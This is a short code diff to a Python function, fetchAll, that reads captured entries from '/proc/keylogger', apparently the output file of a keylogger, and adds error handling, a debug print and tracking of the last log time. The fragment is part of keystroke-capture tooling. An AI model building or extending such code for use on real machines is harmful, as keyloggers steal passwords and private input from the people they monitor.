@@ -12,17 +12,21 @@ def fetchAll():
     Returns:
         array: contents of the log file.
     """
-   
-    logFile = readFile("/proc/keylogger")
+    try:
+        logFile = readFile("/proc/keylogger")
 
-    if logFile:
-        date, time, content = logFile.split()
-        global lastLogTime
-        if(time!= lastLogTime):
-            return [date, time, content]
+        if logFile:
+            try:
+                date, time, content = logFile.split()
+                global lastLogTime 
+                if(time!= lastLogTime):
+                    print(time,"!=",lastLogTime)
+                    lastLogTime=time
+                    return [date, time, content]
+            except:
+                return None
         else:
-           return None
-    else:
+            return None 
+    except:
         return None 
- 
 fetchAll()
